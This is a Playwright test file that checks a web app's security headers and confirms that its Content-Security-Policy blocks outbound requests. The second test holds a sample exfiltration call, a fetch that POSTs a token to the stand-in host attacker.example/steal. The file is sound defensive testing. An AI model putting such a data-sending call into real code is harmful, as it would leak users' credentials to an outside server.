import { expect, test } from '@playwright/test';
import { mockApi } from './mock-api';

test('pages are served with security headers', async ({ page }) => {
  await mockApi(page);
  const response = await page.goto('/login');
  const headers = response?.headers() ?? {};
  const csp = headers['content-security-policy'] ?? '';
  expect(csp).toContain("connect-src 'self' http://127.0.0.1:8999");
  expect(csp).toContain("object-src 'none'");
  expect(csp).toContain("frame-ancestors 'none'");
  expect(headers['x-frame-options']).toBe('DENY');
  expect(headers['x-content-type-options']).toBe('nosniff');
  expect(headers['x-powered-by']).toBeUndefined();
});

test('the CSP blocks sending data to an unknown server', async ({ page }) => {
  await mockApi(page);
  await page.goto('/login');
  const violation = await page.evaluate(
    () =>
      new Promise<string>((resolve) => {
        document.addEventListener('securitypolicyviolation', (event) => resolve(event.effectiveDirective), {
          once: true,
        });
        fetch('https://attacker.example/steal', { method: 'POST', body: 'token' }).catch(() => undefined);
      }),
  );
  expect(violation).toBe('connect-src');
});
